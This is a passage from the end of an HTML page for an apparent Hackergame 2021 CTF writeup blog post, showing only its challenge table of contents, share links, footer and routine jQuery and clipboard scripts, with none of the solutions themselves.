            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../https:/github.com/KpwnZ">Projects</a>
        </span>
      </li>
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Hackergame 2021</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E5%88%B6%E5%8D%81%E5%85%AD%E2%80%94%E2%80%94%E5%8F%82%E4%B8%8A"><span class="toc-number">1.2.</span> <span class="toc-text">进制十六——参上</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94-Pro-Max"><span class="toc-number">1.3.</span> <span class="toc-text">猫咪问答 Pro Max</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%96%E7%93%9C"><span class="toc-number">1.4.</span> <span class="toc-text">卖瓜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%8F%E6%98%8E%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">1.5.</span> <span class="toc-text">透明的文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87"><span class="toc-number">1.6.</span> <span class="toc-text">旅行照片</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FLAG-%E5%8A%A9%E5%8A%9B%E5%A4%A7%E7%BA%A2%E5%8C%85"><span class="toc-number">1.7.</span> <span class="toc-text">FLAG 助力大红包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Amnesia"><span class="toc-number">1.8.</span> <span class="toc-text">Amnesia</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%BB%E5%BA%A6%E5%A4%B1%E5%BF%86"><span class="toc-number">1.8.1.</span> <span class="toc-text">轻度失忆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B0%E5%BF%86%E6%B8%85%E9%99%A4"><span class="toc-number">1.8.2.</span> <span class="toc-text">记忆清除</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E4%B9%8B%E4%B8%8A%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.9.</span> <span class="toc-text">图之上的信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-RSA"><span class="toc-number">1.10.</span> <span class="toc-text">Easy RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%9B%E5%8D%9A%E5%8E%A8%E6%88%BF"><span class="toc-number">1.11.</span> <span class="toc-text">赛博厨房</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%81%AF%EF%BC%8C%E7%AD%89%E7%81%AF%E7%AD%89%E7%81%AF"><span class="toc-number">1.12.</span> <span class="toc-text">灯，等灯等灯</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Level1"><span class="toc-number">1.12.1.</span> <span class="toc-text">Level1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AA%E8%AF%BB%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.13.</span> <span class="toc-text">只读文件系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B7%E7%8E%8B%E4%B8%8E%E9%87%8E%E7%94%9F%E7%9A%84-GPA"><span class="toc-number">1.14.</span> <span class="toc-text">卷王与野生的 GPA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A9%E8%AE%B0%E8%AF%8D"><span class="toc-number">1.15.</span> <span class="toc-text">助记词</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%A1%BF%E5%A4%A7%E9%A4%90"><span class="toc-number">1.15.1.</span> <span class="toc-text">第一顿大餐</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#minecRaft"><span class="toc-number">1.16.</span> <span class="toc-text">minecRaft</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fzuu"><span class="toc-number">1.17.</span> <span class="toc-text">fzuu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E6%98%9F%E4%BA%BA%E7%9A%84%E9%9F%B3%E6%B8%B8%E6%8E%8C%E6%9C%BA"><span class="toc-number">1.18.</span> <span class="toc-text">外星人的音游掌机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%85-OI-%E7%9A%84-Writeup-%E6%A8%A1%E6%8B%9F%E5%99%A8"><span class="toc-number">1.19.</span> <span class="toc-text">超 OI 的 Writeup 模拟器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9C%E7%84%B6%E8%BF%98%E6%98%AF%E9%80%86%E5%90%91%E6%AF%94%E8%BE%83%E7%AE%80%E5%8D%95%EF%BC%8C%E8%BF%99%E6%AC%A1%E6%B2%A1%E4%BA%BA%E4%B8%A4%E5%B0%8F%E6%97%B6%E6%89%8B%E5%81%9A%E4%BA%86%E5%90%A7"><span class="toc-number">1.19.1.</span> <span class="toc-text">果然还是逆向比较简单，这次没人两小时手做了吧</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&text=Hackergame2021 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&title=Hackergame2021 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&is_video=false&description=Hackergame2021 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Hackergame2021 Writeup&body=Check out this article: https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&title=Hackergame2021 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&title=Hackergame2021 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&title=Hackergame2021 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&title=Hackergame2021 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&name=Hackergame2021 Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&t=Hackergame2021 Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Xia0o0o0o
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="../../../../index.html">Home</a></li><!--
     --><!--
       --><li><a href="../../../../archives/">Writing</a></li><!--
     --><!--
       --><li><a href="../../../../https:/github.com/KpwnZ">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="../../../../js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
